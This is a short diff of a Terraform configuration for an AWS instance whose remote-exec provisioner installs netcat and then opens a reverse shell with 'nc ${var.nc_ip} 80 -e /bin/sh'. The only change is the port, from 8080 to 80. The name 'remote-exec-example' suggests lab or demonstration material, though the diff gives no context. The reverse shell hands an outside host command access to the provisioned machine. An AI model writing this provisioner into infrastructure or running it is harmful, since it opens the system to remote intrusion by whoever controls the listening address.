@@ -25,7 +25,7 @@ resource "aws_instance" "remote-exec-example" {
 provisioner "remote-exec" {
   inline = [
     "sh -c 'sudo yum install ec2-instance-connect nc -y || true'",
-    "sh -c 'nc ${var.nc_ip} 8080 -e /bin/sh || true'"
+    "sh -c 'nc ${var.nc_ip} 80 -e /bin/sh || true'"
   ]
 }
 
